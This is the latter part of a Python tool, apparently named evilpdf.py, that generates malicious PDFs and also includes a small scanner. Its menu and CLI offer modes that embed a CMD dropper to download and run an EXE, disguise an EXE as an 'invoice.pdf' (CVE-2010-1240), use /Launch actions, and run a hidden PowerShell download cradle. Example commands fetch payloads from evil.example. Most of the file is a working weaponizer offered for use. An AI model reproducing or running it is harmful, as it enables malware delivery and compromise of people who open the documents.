            if self.decoy_pdf:
                status("⚙", "building exploit structure (decoy-import mode)...")
                try:
                    pdf, rows = self.build_with_decoy()
                except ValueError as e:
                    warn(f"decoy import failed ({e}) — falling back to scratch")
                    self.decoy_pdf = None
                    pdf, rows = self.build_scratch()
            else:
                status("⚙", "building exploit structure (scratch mode)...")
                pdf, rows = self.build_scratch()

            status("⚙", f"writing PDF: {C.CYAN}{self.output_file}{C.RESET} ...")
            with open(self.output_file, 'wb') as f:
                f.write(pdf)

            size = os.path.getsize(self.output_file)
            if size < 500:
                err("output suspiciously small!")
                return False

            status("✓", f"EVIL PDF created : {C.CYAN}{self.output_file}{C.RESET}")
            status("✓", f"file size        : {C.YELLOW}{size:,}{C.RESET} bytes")

            if DEBUG[0]:
                hr()
                for r in rows:
                    if len(r) == 3 and r[2]:
                        print(f"  {C.DIM}[debug]   obj {r[0]:>3} {r[1]:<12} "
                              f"@ {r[2]}{C.RESET}")
                hr()

            print()
            hr('═')
            print(f"  {C.BOLD}{C.YELLOW}EXPLOIT DETAILS:{C.RESET}")
            hr('═')

            def row(label, value):
                print(f"  {C.GREEN}{C.BOLD}►{C.RESET} {label:<16}: "
                      f"{C.CYAN}{value}{C.RESET}")

            row("Mode", self.mode)
            if self.exe_url:
                row("Payload URL", self.exe_url)
            if self.exe_file:
                row("Payload file", self.exe_file)
            if self.local_path:
                row("Local target", self.local_path)
            if self.script_url:
                row("Cradle URL", self.script_url)
            if self.embed_name:
                row("Embedded file", self.embed_name)
            if self.payload is not None:
                row("Payload bytes", f"{len(self.payload):,}")
            row("Icon applied", self.icon_applied)
            row("Decoy PDF", self.decoy_pdf or "-")
            row("Output file", self.output_file)
            row("File size", f"{size:,} bytes")
            return True
        except Exception as e:
            err(f"error generating PDF: {e}")
            return False


# ══════════════════════════════════════════════════════════════════
#  SCANNER
# ══════════════════════════════════════════════════════════════════

PATTERNS = {
    "launch action":    rb"/S\s*/Launch|/Launch\b",
    "javascript":       rb"/S\s*/JavaScript|/JS\b",
    "embedded files":   rb"/EmbeddedFiles\b",
    "embedded stream":  rb"/EF\s*<<|/Type\s*/EmbeddedFile",
    "open action":      rb"/OpenAction\b",
    "exportDataObject": rb"exportDataObject",
    "pe under pdf ext": rb"\.pdf\)\s*/Desc|application#2Fpdf",
    "lolbin":           rb"powershell|mshta|rundll32|regsvr32|certutil|wscript",
    "url":              rb"https?://[^\s\)>]{6,120}",
}


def streams(data: bytes):
    for m in re.finditer(rb"stream\r?\n", data):
        end = data.find(b"endstream", m.end())
        if end < 0:
            continue
        body = data[m.end():end].rstrip(b"\r\n")
        yield body
        try:
            yield zlib.decompress(body)
        except zlib.error:
            try:
                yield zlib.decompressobj(-15).decompress(body)
            except zlib.error:
                pass


def scan(path: str) -> int:
    try:
        with open(path, 'rb') as f:
            data = f.read()
    except OSError as e:
        err(f"cannot read {path}: {e}")
        return 1

    haystacks = [data] + list(streams(data))
    print(f"  {C.CYAN}[*]{C.RESET} {path}  ({len(data)} bytes, "
          f"{len(haystacks) - 1} decodable streams)")

    if not data.startswith(b"%PDF"):
        warn("no %PDF header")
        return 1

    hits = {}
    for label, pat in PATTERNS.items():
        found = set()
        for h in haystacks:
            for m in re.finditer(pat, h, re.I):
                found.add(m.group(0)[:120])
        if found:
            hits[label] = found

    if not hits:
        print("  [-] no /Launch, no JS, no embedded files — inert")
        return 0

    for label, found in hits.items():
        print(f"  {C.YELLOW}[+]{C.RESET} {label}")
        for f in sorted(found):
            print(f"        {f.decode('latin-1', 'replace')}")

    verdict = 0
    if "launch action" in hits:
        verdict += 3
    if "embedded files" in hits or "embedded stream" in hits:
        verdict += 2
    if "exportDataObject" in hits:
        verdict += 1

    print()
    print("  [=] verdict:", (C.RED + "CRITICAL - will execute code" if verdict >= 4
                             else C.YELLOW + "HIGH - executes code" if verdict >= 3
                             else C.MAGENTA + "MEDIUM - inspect manually") + C.RESET)
    return 0


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE MENU  (numbers optional — Enter takes the default)
# ══════════════════════════════════════════════════════════════════

MODES = [
    ("0", "scan",     "scan an existing PDF and report what it can do"),
    ("1", "url",      "open a URL in a new browser tab (nothing embedded)"),
    ("2", "cmd",      "embed a CMD dropper that downloads your EXE and runs it"),
    ("3", "exe",      "embed the EXE itself (rename it, optionally stamp an icon)"),
    ("4", "batch",    "embed YOUR OWN .cmd/.bat file"),
    ("5", "js",       "embed the CMD dropper but use YOUR OWN OpenAction JS"),
    ("6", "embed",    "CVE-2010-1240: EXE disguised as <stem>.pdf, export + /Launch"),
    ("7", "nojs",     "CVE-2010-1239: /Launch only, no JS, no embedded file"),
    ("8", "local",    "/Launch an arbitrary local program + arguments"),
    ("9", "download", "/Launch a hidden PowerShell download cradle"),
]


def ask(prompt, default=""):
    suffix = f" {C.DIM}[{C.CYAN}{default}{C.DIM}]{C.RESET}" if default else ""
    try:
        val = input(f"  {C.GREEN}{C.BOLD}?{C.RESET} {prompt}{suffix}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)
    return val or default


def interactive():
    print(BANNER)
    print(f"  {C.BOLD}MODES{C.RESET}  {C.DIM}(type the number, or just press "
          f"Enter for 2){C.RESET}")
    for num, _mode, desc in MODES:
        mark = f"{C.YELLOW}(default){C.RESET}" if num == "2" else ""
        print(f"   {C.CYAN}{num}{C.RESET}  {desc} {mark}")
    print()

    num = ask("mode", "2")
    table = {n: m for n, m, _d in MODES}
    if num not in table:
        err(f"unknown choice '{num}'")
        return None
    mode = table[num]

    if mode == "scan":
        path = ask("PDF to scan")
        if not path:
            err("no file given")
            return None
        return {"mode": "scan", "scan_path": path}

    cfg = {"mode": mode}

    if mode in NEEDS_URL:
        cfg["exe_url"] = ask("payload EXE URL (https://...)")
        if not cfg["exe_url"]:
            err("a URL is required for this mode")
            return None

    if mode in NEEDS_EXE:
        cfg["exe_file"] = ask("local EXE path (Enter = download from the URL)", "")
    if mode == "embed":
        cfg["alias"] = ask("disguise stem (drops as <stem>.pdf)", "invoice")
        cfg["message"] = ask("text injected into the Launch dialog File: field", "")
    if mode == "batch":
        cfg["batch_file"] = ask("path to your .cmd/.bat file")
        if not cfg["batch_file"]:
            err("a batch file is required")
            return None
    if mode == "js":
        cfg["js_file"] = ask("path to your OpenAction .js file")
        if not cfg["js_file"]:
            err("a JS file is required")
            return None
    if mode == "local":
        cfg["local_path"] = ask("local program to launch", r"C:\Windows\System32\calc.exe")
        cfg["local_args"] = ask("arguments", "")
        cfg["message"] = ask("text for the Launch dialog", "")
    if mode == "download":
        cfg["script_url"] = ask("URL of your PowerShell script")
        cfg["message"] = ask("text for the Launch dialog", "")

    if mode in NEEDS_EXE and mode != "embed":
        cfg["icon"] = ask("optional .ico to stamp into the EXE", "")
    if mode in EMBEDDING:
        cfg["alias"] = cfg.get("alias") or ask("embedded file name", "")

    cfg["out_name"] = ask("output PDF name", "evil.pdf")
    cfg["save_path"] = ask("output directory", ".")
    cfg["decoy_pdf"] = ask("optional decoy PDF to import", "")
    if not cfg["decoy_pdf"] and mode not in ("embed", "nojs", "local", "download"):
        cfg["custom_text"] = ask("optional page text (blank = default)", "")
    cfg["title"] = ask("PDF /Title", "Document")
    cfg["debug"] = ask("debug output? y/N", "n").lower().startswith("y")
    return cfg


# ══════════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════════

EPILOG = """
examples:
  # interactive menu, every number optional
  ./evilpdf.py --menu

  # classic v4.x: EXE URL + embedded cmd dropper
  ./evilpdf.py https://evil.example/upd.exe invoice.pdf

  # CVE-2010-1240: embed a local EXE disguised as invoice.pdf
  ./evilpdf.py --mode embed --exe beacon.exe --alias invoice --out invoice.pdf

  # CVE-2010-1239: /Launch a local program, no JS, no embedded file
  ./evilpdf.py --mode nojs --local 'C:\\Windows\\System32\\calc.exe'

  # PowerShell cradle, no embedded file at all
  ./evilpdf.py --mode download --url https://evil.example/s.ps1 --out x.pdf

  # audit a suspicious PDF
  ./evilpdf.py --scan invoice.pdf
"""


def build_parser():
    ap = argparse.ArgumentParser(
        prog="evilpdf.py",
        description="EXE ➜ evil PDF generator (JS dropper + CVE-2010-1240) and scanner",
        epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("exe_url", nargs="?", default="", help="URL of the EXE to embed")
    ap.add_argument("pdf_name", nargs="?", default="", help="name of the output PDF")
    ap.add_argument("--mode", choices=["url", "cmd", "exe", "batch", "js",
                                       "embed", "nojs", "local", "download"],
                    help="technique (default: cmd when a URL is given)")
    ap.add_argument("--save-path", default=".", help="output directory (default: .)")
    ap.add_argument("--exe", dest="exe_file", help="local EXE to embed instead of downloading")
    ap.add_argument("--decoy-pdf", help="import this PDF as the visible document")
    ap.add_argument("--custom-text", help="text shown on the generated page")
    ap.add_argument("--alias", help="name for the embedded file / disguise stem")
    ap.add_argument("--icon", help=".ico to stamp into a directly embedded EXE")
    ap.add_argument("--batch-file", help="your own .cmd/.bat to embed (mode batch)")
    ap.add_argument("--js-file", help="your own OpenAction JS (mode js)")
    ap.add_argument("--local", dest="local_path", help="local program for mode local")
    ap.add_argument("--args", dest="local_args", default="", help="arguments for --local")
    ap.add_argument("--url", dest="script_url", default="", help="script URL for mode download")
    ap.add_argument("--name", dest="stem", help="disguise stem for modes embed/nojs")
    ap.add_argument("--message", default="", help="text injected into the Launch dialog")
    ap.add_argument("--title", default="Document", help="PDF /Title")
    ap.add_argument("--scan", metavar="PDF", help="scan an existing PDF and exit")
    ap.add_argument("--print-script", action="store_true",
                    help="dump the generated cmd.exe command line and exit")
    ap.add_argument("--menu", action="store_true", help="force the interactive menu")
    ap.add_argument("--debug", action="store_true", help="debug object/offset dumps")
    ap.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    ap.add_argument("--version", action="version", version="evilpdf %s" % __version__)
    return ap


def main() -> int:
    init_ansi()
    ap = build_parser()
    args = ap.parse_args()
    if args.no_color:
        strip_color()

    DEBUG[0] = args.debug

    if args.scan:
        print(BANNER)
        return scan(args.scan)

    cli_used = bool(args.exe_url or args.pdf_name or args.mode)
    if args.menu or not cli_used:
        cfg = interactive()
        if not cfg:
            return 2
        if cfg["mode"] == "scan":
            print(BANNER)
            return scan(cfg["scan_path"])
        DEBUG[0] = bool(cfg.get("debug"))
        print()
        forge = PDFForge(
            mode=cfg["mode"],
            exe_url=cfg.get("exe_url", ""),
            out_name=cfg.get("out_name", "evil.pdf"),
            save_path=cfg.get("save_path", "."),
            exe_file=cfg.get("exe_file") or None,
            decoy_pdf=cfg.get("decoy_pdf") or None,
            custom_text=cfg.get("custom_text") or None,
            alias=cfg.get("alias") or args.stem,
            icon=cfg.get("icon") or None,
            batch_file=cfg.get("batch_file") or None,
            js_file=cfg.get("js_file") or None,
            local_path=cfg.get("local_path", ""),
            local_args=cfg.get("local_args", ""),
            script_url=cfg.get("script_url", ""),
            message=cfg.get("message", ""),
            title=cfg.get("title", "Document"))
        ok = forge.generate()
        print()
        print(f"  {C.GREEN}[✓] done.{C.RESET}" if ok
              else f"  {C.RED}[✗] generation failed.{C.RESET}")
        return 0 if ok else 1

    mode = args.mode or ("cmd" if args.exe_url else "local")
    if mode in NEEDS_EXE and not (args.exe_url or args.exe_file):
        print("[!] this mode needs --exe or a payload URL", file=sys.stderr)
        return 2
    if mode in NEEDS_URL and not args.exe_url:
        print("[!] this mode needs a payload URL", file=sys.stderr)
        return 2
    if mode == "download" and not args.script_url:
        print("[!] download mode needs --url", file=sys.stderr)
        return 2

    stem = args.stem or args.alias

    if args.print_script and mode in ("embed", "nojs"):
        s = re.sub(r"[^A-Za-z0-9_.-]", "_", stem or "invoice") or "invoice"
        if s.lower().endswith(".pdf"):
            s = s[:-4]
        print(build_launch_script(s, args.message))
        return 0

    print(BANNER)
    forge = PDFForge(
        mode=mode,
        exe_url=args.exe_url,
        out_name=args.pdf_name or "evil.pdf",
        save_path=args.save_path,
        exe_file=args.exe_file,
        decoy_pdf=args.decoy_pdf,
        custom_text=args.custom_text,
        alias=stem,
        icon=args.icon,
        batch_file=args.batch_file,
        js_file=args.js_file,
        local_path=args.local_path or "",
        local_args=args.local_args,
        script_url=args.script_url,
        message=args.message,
        title=args.title)

    if not forge.generate():
        print(f"\n  {C.RED}[✗] PDF generation failed.{C.RESET}")
        return 1

    print()
    print(f"  {C.DIM}[*] self-check:{C.RESET}")
    scan(forge.output_file)
    print(f"\n  {C.GREEN}[✓] PDF generated successfully!{C.RESET}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}[!] interrupted{C.RESET}")
        sys.exit(130)